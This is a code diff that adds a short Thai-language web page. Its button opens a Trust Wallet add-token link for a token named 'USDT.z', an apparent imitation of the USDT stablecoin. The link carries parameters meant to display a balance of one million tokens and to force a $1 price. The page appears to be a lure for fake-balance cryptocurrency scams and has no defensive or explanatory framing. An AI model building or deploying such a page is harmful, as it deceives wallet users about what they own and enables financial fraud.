@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="th">
+
+<head>
+  <meta charset="utf-8" />
+  <title>รับ 1 000 000 USDT.z</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+  <h2>กดปุ่ม → Trust Wallet จะแสดง 1 000 000 USDT.z</h2>
+  <button onclick="add()">เพิ่มโทเคน</button>
+  <script>
+    function add() {
+      location.href =
+        "https://link.trustwallet.com/add_token?chainId=56" +
+        "&tokenAddress=0xAAcB463C5B4bb419D47f94058D6aB6fB1B84adef" +
+        "&symbol=USDTz&name=USDT.z&decimals=18" +
+        "&logoURI=https://raw.githubusercontent.com/khanitohm/usdtz.png/main/logo/logo.png" +
+        "&balance=1000000000000000000000000" + // 1 000 000 * 1e18
+        "&priceUSD=1";                       // บังคับ $1
+    }
+  </script>
+</body>
+
+</html>
